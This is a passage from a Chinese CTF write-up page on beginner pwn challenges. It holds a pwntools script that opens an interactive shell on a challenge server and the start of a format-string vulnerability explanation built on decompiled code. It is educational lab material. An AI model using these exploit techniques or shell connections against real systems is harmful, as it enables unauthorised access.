
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>PWN Exercise Area · Eki's CTF</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="Eki">
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-katex/katex.min.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-multipart/multipart.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-advanced-emoji/emoji-website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-pageview-count/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-code/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-auto-scroll-table/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="reverse-execrise-area.html" />
    
    
    <link rel="prev" href="web-execrise-area.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    
    
        
        <li>
            <a href="https://ieki.xyz" target="_blank" class="custom-link">主站 Eki's Blog</a>
        </li>
    
    

    
    <li class="divider"></li>
    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    About
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../library/">
            
                <a href="../library/">
            
                    
                    Library
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../library/steganography.html">
            
                <a href="../library/steganography.html">
            
                    
                    Steganography
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../library/gdb-tutorial.html">
            
                <a href="../library/gdb-tutorial.html">
            
                    
                    GDB Tutorial
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3" data-path="../library/sqli.html">
            
                <a href="../library/sqli.html">
            
                    
                    SQL Inject
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4" >
            
                <span>
            
                    
                    PHP
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.4.1" data-path="../library/php/function.html">
            
                <a href="../library/php/function.html">
            
                    
                    Functions
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.2" data-path="../library/php/protocol.html">
            
                <a href="../library/php/protocol.html">
            
                    
                    Protocol
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.3" data-path="../library/php/ace.html">
            
                <a href="../library/php/ace.html">
            
                    
                    ACE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.4" data-path="../library/php/serialize.html">
            
                <a href="../library/php/serialize.html">
            
                    
                    Serialize
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.5" data-path="../library/php/misc.html">
            
                <a href="../library/php/misc.html">
            
                    
                    Misc
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.5" data-path="../library/htaccess.html">
            
                <a href="../library/htaccess.html">
            
                    
                    Apache .htaccess
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.6" data-path="../library/ssti.html">
            
                <a href="../library/ssti.html">
            
                    
                    SSTI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.7" data-path="../library/ssrf.html">
            
                <a href="../library/ssrf.html">
            
                    
                    SSRF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.8" data-path="../library/xxe.html">
            
                <a href="../library/xxe.html">
            
                    
                    XXE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.9" data-path="../library/xss.html">
            
                <a href="../library/xss.html">
            
                    
                    XSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.10" data-path="../library/shell.html">
            
                <a href="../library/shell.html">
            
                    
                    Shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.11" data-path="../library/crypto.html">
            
                <a href="../library/crypto.html">
            
                    
                    Crypto
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.12" data-path="../library/js.html">
            
                <a href="../library/js.html">
            
                    
                    JavaScript
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.13" data-path="../library/python.html">
            
                <a href="../library/python.html">
            
                    
                    Python
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.14" data-path="../library/bash.html">
            
                <a href="../library/bash.html">
            
                    
                    BASH
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.15" data-path="../library/forensics.html">
            
                <a href="../library/forensics.html">
            
                    
                    Forensics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.16" data-path="../library/pentest.html">
            
                <a href="../library/pentest.html">
            
                    
                    Pentest
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.17" data-path="../library/protocol.html">
            
                <a href="../library/protocol.html">
            
                    
                    Protocol
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.18" data-path="../library/misc.html">
            
                <a href="../library/misc.html">
            
                    
                    MISC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.19" data-path="../library/awd.html">
            
                <a href="../library/awd.html">
            
                    
                    AWD
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../contest/">
            
                <a href="../contest/">
            
                    
                    Contest
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../contest/hfctf-2021.html">
            
                <a href="../contest/hfctf-2021.html">
            
                    
                    2021数字中国创新大赛虎符网络安全赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../contest/hackergame-2019.html">
            
                <a href="../contest/hackergame-2019.html">
            
                    
                    Hackergame 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="../contest/tsctf-j2019.html">
            
                <a href="../contest/tsctf-j2019.html">
            
                    
                    TSCTF-J 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="../contest/nctf2019.html">
            
                <a href="../contest/nctf2019.html">
            
                    
                    NCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.5" data-path="../contest/isoon-2019.html">
            
                <a href="../contest/isoon-2019.html">
            
                    
                    ISOON 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.6" data-path="../contest/mrctf-2020.html">
            
                <a href="../contest/mrctf-2020.html">
            
                    
                    MRCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.7" data-path="../contest/hfctf-2020.html">
            
                <a href="../contest/hfctf-2020.html">
            
                    
                    2020数字中国创新大赛虎符网络安全赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.8" data-path="../contest/npuctf-2020.html">
            
                <a href="../contest/npuctf-2020.html">
            
                    
                    NPUCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.9" data-path="../contest/gkctf-2020.html">
            
                <a href="../contest/gkctf-2020.html">
            
                    
                    GKCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.10" data-path="../contest/sctf-2020.html">
            
                <a href="../contest/sctf-2020.html">
            
                    
                    SCTF 2020
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="./">
            
                <a href="./">
            
                    
                    ADworld
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="misc-exercise-area.html">
            
                <a href="misc-exercise-area.html">
            
                    
                    Misc Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="crypto-execrise-area.html">
            
                <a href="crypto-execrise-area.html">
            
                    
                    Crypto Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="web-execrise-area.html">
            
                <a href="web-execrise-area.html">
            
                    
                    Web Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.4.4" data-path="pwn-exercise-area.html">
            
                <a href="pwn-exercise-area.html">
            
                    
                    PWN Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.5" data-path="reverse-execrise-area.html">
            
                <a href="reverse-execrise-area.html">
            
                    
                    Reverse Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.6" data-path="easy_tornado.html">
            
                <a href="easy_tornado.html">
            
                    
                    Easy Tornado
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.7" data-path="i-got-id-200.html">
            
                <a href="i-got-id-200.html">
            
                    
                    i-got-id-200
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.8" data-path="ics-02.html">
            
                <a href="ics-02.html">
            
                    
                    ics-02
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.9" data-path="ics-07.html">
            
                <a href="ics-07.html">
            
                    
                    ics-07
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.10" data-path="shrine.html">
            
                <a href="shrine.html">
            
                    
                    shrine
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.11" data-path="super_sqli.html">
            
                <a href="super_sqli.html">
            
                    
                    super_sqli
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.12" data-path="web_php_unserialize.html">
            
                <a href="web_php_unserialize.html">
            
                    
                    Web_php_unserialize
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.13" data-path="web_php_wrong_nginx_config.html">
            
                <a href="web_php_wrong_nginx_config.html">
            
                    
                    web_php_wrong_nginx_config
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.14" data-path="web_python_template_injection.html">
            
                <a href="web_python_template_injection.html">
            
                    
                    Web_python_template_injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.15" data-path="wtf.sh-150.html">
            
                <a href="wtf.sh-150.html">
            
                    
                    wtf.sh-150
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.16" data-path="zhuanxv.html">
            
                <a href="zhuanxv.html">
            
                    
                    Zhuanxv
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="../buuoj/">
            
                <a href="../buuoj/">
            
                    
                    BUUOJ
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="../buuoj/suctf-2019.html">
            
                <a href="../buuoj/suctf-2019.html">
            
                    
                    SUCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="../buuoj/ciscn-northeast-2019.html">
            
                <a href="../buuoj/ciscn-northeast-2019.html">
            
                    
                    CISCN 2019 华北赛区
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="../buuoj/ciscn-pre-2019.html">
            
                <a href="../buuoj/ciscn-pre-2019.html">
            
                    
                    CISCN 2019 初赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4" data-path="../buuoj/ciscn-final-2019.html">
            
                <a href="../buuoj/ciscn-final-2019.html">
            
                    
                    CISCN 2019 Final
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5" data-path="../buuoj/de1ctf-2019.html">
            
                <a href="../buuoj/de1ctf-2019.html">
            
                    
                    De1CTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6" data-path="../buuoj/wangdingcup-2018.html">
            
                <a href="../buuoj/wangdingcup-2018.html">
            
                    
                    网鼎杯 2018
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.7" data-path="../buuoj/wangdingcup-2019.html">
            
                <a href="../buuoj/wangdingcup-2019.html">
            
                    
                    网鼎杯 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.8" data-path="../buuoj/roarctf-2019.html">
            
                <a href="../buuoj/roarctf-2019.html">
            
                    
                    RoarCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.9" data-path="../buuoj/0ctf-2016.html">
            
                <a href="../buuoj/0ctf-2016.html">
            
                    
                    0CTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.10" data-path="../buuoj/gxyctf-2019.html">
            
                <a href="../buuoj/gxyctf-2019.html">
            
                    
                    GXYCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.11" data-path="../buuoj/hitcon-2017.html">
            
                <a href="../buuoj/hitcon-2017.html">
            
                    
                    Hitcon 2017
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.12" data-path="../buuoj/jikedatiaozhan-2019.html">
            
                <a href="../buuoj/jikedatiaozhan-2019.html">
            
                    
                    极客大挑战2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.13" data-path="../buuoj/lctf-2018.html">
            
                <a href="../buuoj/lctf-2018.html">
            
                    
                    LCTF 2018
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.14" data-path="../buuoj/de1ctf-2019.html">
            
                <a href="../buuoj/de1ctf-2019.html">
            
                    
                    De1CTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.15" data-path="../buuoj/swpu-2019.html">
            
                <a href="../buuoj/swpu-2019.html">
            
                    
                    SWPU 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.16" data-path="../buuoj/suctf-2019.html">
            
                <a href="../buuoj/suctf-2019.html">
            
                    
                    SUCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.17" data-path="../buuoj/bjdctf-2020.html">
            
                <a href="../buuoj/bjdctf-2020.html">
            
                    
                    BJDCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.18" data-path="../buuoj/rctf-2015.html">
            
                <a href="../buuoj/rctf-2015.html">
            
                    
                    RCTF 2015
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.19" data-path="../buuoj/bytectf-2019.html">
            
                <a href="../buuoj/bytectf-2019.html">
            
                    
                    ByteCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.20" data-path="../buuoj/qiangwangbei-2019.html">
            
                <a href="../buuoj/qiangwangbei-2019.html">
            
                    
                    强网杯 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.21" data-path="../buuoj/ddctf-2019.html">
            
                <a href="../buuoj/ddctf-2019.html">
            
                    
                    DDCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.22" data-path="../buuoj/eis-2019.html">
            
                <a href="../buuoj/eis-2019.html">
            
                    
                    EIS 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.23" data-path="../buuoj/vn-2020.html">
            
                <a href="../buuoj/vn-2020.html">
            
                    
                    V&N 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.24" data-path="../buuoj/fbctf-2019.html">
            
                <a href="../buuoj/fbctf-2019.html">
            
                    
                    FBCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.25" data-path="../buuoj/gyctf-2020.html">
            
                <a href="../buuoj/gyctf-2020.html">
            
                    
                    GYCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.26" data-path="../buuoj/bjd-2nd.html">
            
                <a href="../buuoj/bjd-2nd.html">
            
                    
                    BJDCTF 2nd
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.27" data-path="../buuoj/fireshellctf-2020.html">
            
                <a href="../buuoj/fireshellctf-2020.html">
            
                    
                    FireShellCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.28" data-path="../buuoj/gyctf-2020.html">
            
                <a href="../buuoj/gyctf-2020.html">
            
                    
                    GWCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.29" data-path="../buuoj/watevrctf-2019.html">
            
                <a href="../buuoj/watevrctf-2019.html">
            
                    
                    WatervrCTF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.30" data-path="../buuoj/ciscn-southeast-2019.html">
            
                <a href="../buuoj/ciscn-southeast-2019.html">
            
                    
                    CISCN2019 华东南赛区
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.31" data-path="../buuoj/bsidescf-2019.html">
            
                <a href="../buuoj/bsidescf-2019.html">
            
                    
                    BsidesCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.32" data-path="../buuoj/rctf-2019.html">
            
                <a href="../buuoj/rctf-2019.html">
            
                    
                    RCTF 2019
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="../pwnable.kr/">
            
                <a href="../pwnable.kr/">
            
                    
                    pwnable.kr
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1" data-path="../pwnable.kr/toddlers-bottle.html">
            
                <a href="../pwnable.kr/toddlers-bottle.html">
            
                    
                    Toddler's Bottle
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../ethernaut/">
            
                <a href="../ethernaut/">
            
                    
                    Ethernaut
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8" data-path="../vulnhub/">
            
                <a href="../vulnhub/">
            
                    
                    Vulnhub
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.1" data-path="../vulnhub/dc-9.html">
            
                <a href="../vulnhub/dc-9.html">
            
                    
                    DC-9
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.2" data-path="../vulnhub/five86-1.html">
            
                <a href="../vulnhub/five86-1.html">
            
                    
                    five86-1
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.3" data-path="../vulnhub/wakanda.html">
            
                <a href="../vulnhub/wakanda.html">
            
                    
                    wakanda
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >PWN Exercise Area</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#pwn-exercise-area"><b></b>Pwn Exercise Area</a></li><ul><li><span class="title-icon "></span><a href="#0x00-&#x524D;&#x8A00;"><b></b>0x00 &#x524D;&#x8A00;</a></li><li><span class="title-icon "></span><a href="#0x01-getshell"><b></b>0x01 Getshell</a></li><ul><li><span class="title-icon "></span><a href="#exp"><b></b>Exp</a></li></ul><li><span class="title-icon "></span><a href="#0x02-cgfsb"><b></b>0x02 CGfsb</a></li><ul><li><span class="title-icon "></span><a href="#payload"><b></b>payload</a></li></ul><li><span class="title-icon "></span><a href="#0x03-whendidyouborn"><b></b>0x03 when_did_you_born</a></li><ul><li><span class="title-icon "></span><a href="#payload_1"><b></b>Payload</a></li><li><span class="title-icon "></span><a href="#exp_1"><b></b>Exp</a></li></ul><li><span class="title-icon "></span><a href="#0x04-hellopwn"><b></b>0x04 hello_pwn</a></li><ul><li><span class="title-icon "></span><a href="#payload_2"><b></b>payload</a></li><li><span class="title-icon "></span><a href="#exp_2"><b></b>Exp</a></li></ul><li><span class="title-icon "></span><a href="#0x05-level0"><b></b>0x05 level0</a></li><ul><li><span class="title-icon "></span><a href="#exp_3"><b></b>Exp</a></li></ul><li><span class="title-icon "></span><a href="#0x06-level2"><b></b>0x06 level2</a></li><ul><li><span class="title-icon "></span><a href="#payload_3"><b></b>Payload:</a></li><li><span class="title-icon "></span><a href="#exp_4"><b></b>Exp:</a></li></ul><li><span class="title-icon "></span><a href="#0x07-string"><b></b>0x07 string</a></li><ul><li><span class="title-icon "></span><a href="#payload_4"><b></b>Payload</a></li><li><span class="title-icon "></span><a href="#exp_5"><b></b>Exp</a></li></ul><li><span class="title-icon "></span><a href="#0x08-guessnum"><b></b>0x08 guess_num</a></li><ul><li><span class="title-icon "></span><a href="#payload_5"><b></b>Payload</a></li><li><span class="title-icon "></span><a href="#exp_6"><b></b>Exp</a></li></ul><li><span class="title-icon "></span><a href="#0x09-intoverflow"><b></b>0x09 int_overflow</a></li><ul><li><span class="title-icon "></span><a href="#payload_6"><b></b>Payload</a></li><li><span class="title-icon "></span><a href="#exp_7"><b></b>Exp</a></li></ul><li><span class="title-icon "></span><a href="#0x0a-cgpwn2"><b></b>0x0A cgpwn2</a></li><li><span class="title-icon "></span><a href="#0x0b-level3"><b></b>0x0B level3</a></li><ul><li><span class="title-icon "></span><a href="#payload_7"><b></b>Payload</a></li><li><span class="title-icon "></span><a href="#exp_8"><b></b>Exp</a></li></ul></ul></ul></div><a href="#pwn-exercise-area" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="pwn-exercise-area"><a name="pwn-exercise-area" class="anchor-navigation-ex-anchor" href="#pwn-exercise-area"><i class="fa fa-link" aria-hidden="true"></i></a>Pwn Exercise Area</h1>
<h2 id="0x00-&#x524D;&#x8A00;"><a name="0x00-&#x524D;&#x8A00;" class="anchor-navigation-ex-anchor" href="#0x00-&#x524D;&#x8A00;"><i class="fa fa-link" aria-hidden="true"></i></a>0x00 &#x524D;&#x8A00;</h2>
<p>&#x56E0;&#x4E3A;pwn&#x57FA;&#x7840;&#x5B9E;&#x5728;&#x592A;&#x6B21;&#x6240;&#x4EE5;&#x4ECE;&#x5934;&#x5230;&#x5C3E;&#x5237;&#x4E86;&#x4E00;&#x8FB9;&#x653B;&#x9632;&#x4E16;&#x754C;&#x4E0A;&#x7684;&#x65B0;&#x624B;&#x7EC3;&#x4E60;&#x9898;</p>
<p>wsl+pwntool+vscode &#x592A;&#x8212;&#x9002;&#x4E86; &#x867D;&#x7136;64&#x4F4D;wsl&#x8C03;32&#x4F4D;&#x7684;ELF&#x5F88;&#x9EBB;&#x70E6;</p>
<p>&#x6536;&#x8D27;&#xFF1A;</p>
<ul>
<li>pwntool&#x7684;&#x57FA;&#x672C;&#x4F7F;&#x7528;&#x65B9;&#x5F0F;&#x548C;exp&#x7684;&#x57FA;&#x7840;&#x5199;&#x6CD5;</li>
<li>&#x5BF9;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x65F6;&#x6808;&#x5185;&#x7684;&#x53D8;&#x5316;&#x6709;&#x4E86;&#x66F4;&#x6DF1;&#x7684;&#x4E86;&#x89E3;&#xFF0C;&#x61C2;&#x4E86;&#x4E00;&#x70B9;&#x70B9;&#x6808;&#x6EA2;&#x51FA;&#x7684;&#x542B;&#x4E49;</li>
<li>&#x5BF9;C&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6709;&#x4E86;&#x66F4;&#x6DF1;&#x7684;&#x7406;&#x89E3;</li>
</ul>
<p>Todo:</p>
<ul>
<li>gdb-peda &#x672C;&#x5730;&#x52A8;&#x6001;&#x8C03;&#x8BD5;&#x67E5;&#x770B;&#x7A0B;&#x5E8F;&#x5B9E;&#x65F6;&#x6808;&#x53D8;&#x5316;</li>
<li>pwntool &#x672C;&#x5730;&#x8C03;&#x8BD5;&#x548C;log&#x7684;&#x5199;&#x6CD5;</li>
<li>shellcode&#x7684;&#x7F16;&#x5199;</li>
</ul>
<h2 id="0x01-getshell"><a name="0x01-getshell" class="anchor-navigation-ex-anchor" href="#0x01-getshell"><i class="fa fa-link" aria-hidden="true"></i></a>0x01 Getshell</h2>
<p>&#x771F;&#xB7;&#x8FD0;&#x884C;&#x5C31;&#x80FD;&#x62FF;&#x5230;<del>flag</del> shell</p>
<h3 id="exp"><a name="exp" class="anchor-navigation-ex-anchor" href="#exp"><i class="fa fa-link" aria-hidden="true"></i></a>Exp</h3>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
io=remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>,<span class="hljs-string">&quot;30397&quot;</span>)
io.interactive()
</code></pre>
<p>&#x7136;&#x540E;cat flag&#x5C31;&#x5B8C;&#x4E8B;&#x4E86;</p>
<h2 id="0x02-cgfsb"><a name="0x02-cgfsb" class="anchor-navigation-ex-anchor" href="#0x02-cgfsb"><i class="fa fa-link" aria-hidden="true"></i></a>0x02 CGfsb</h2>
<p>&#x6700;&#x57FA;&#x7840;&#x7684;printf&#x683C;&#x5F0F;&#x5316;&#x6F0F;&#x6D1E;</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/" target="_blank">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/</a></p>
<p>checksec &#x4E00;&#x4E0B;&#x53D1;&#x73B0;&#x662F;32&#x4F4D;&#x7684;ELF &#x7136;&#x540E;&#x4E5F;&#x6CA1;&#x6709;&#x5F00;PIE</p>
<p>&#x4E22;&#x8FDB;ida pro,&#x5173;&#x952E;&#x90E8;&#x5206;&#x957F;&#x8FD9;&#x6837;</p>
<pre><code class="lang-cpp">  <span class="hljs-built_in">printf</span>(&amp;s);
  <span class="hljs-keyword">if</span> ( pwnme == <span class="hljs-number">8</span> )
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;you pwned me, here is your flag:\n&quot;</span>);
    system(<span class="hljs-string">&quot;cat flag&quot;</span>);
  }
  <span class="hljs-keyword">else</span>
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Thank you!&quot;</span>);
  }
</code></pre>
<p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6211;&#x4EEC;&#x8981;&#x4FEE;&#x6539;pwnme&#x7684;&#x503C;&#x4E3A;8</p>
<p>&#x6709;&#x6CA1;&#x89C9;&#x5F97;&#x8FD9;&#x4E2A;printf&#x5F88;&#x5947;&#x602A;&#xFF1F;</p>
<p>&#x5728;&#x4E0D;&#x5E26;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x4E00;&#x822C;&#x662F;&#x8FD9;&#x6837;&#x5199;&#x7684;</p>
<pre><code class="lang-cpp"><span class="hljs-built_in">printf</span>(&#x201C;xxxx&#x201D;);
</code></pre>
<p>&#x7531;&#x6B64;&#x60F3;&#x8981;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;s&#xFF0C;&#x5199;</p>
<pre><code class="lang-cpp"><span class="hljs-built_in">printf</span>(&amp;s);
</code></pre>
<p>&#x4E5F;&#x662F;&#x6CA1;&#x6709;&#x95EE;&#x9898;&#x7684;</p>
<p>&#x4F46;&#x662F;&#xFF0C;&#x7531;&#x4E8E;printf&#x63A5;&#x53D7;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x53EF;&#x4EE5;&#x5E26;%&#x8FDB;&#x884C;&#x683C;&#x5F0F;&#x5316;&#x63A7;&#x5236;&#x7684;&#x3002;</p>
<p>&#x5982;&#x679C;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5728;&#x5B57;&#x7B26;&#x4E32;&#x91CC;&#x5199;&#x5165;&#x683C;&#x5F0F;&#x5316;&#x63A7;&#x5236;&#xFF0C;&#x4F1A;printf&#x51FA;&#x6765;&#x5565;&#x5462;</p>
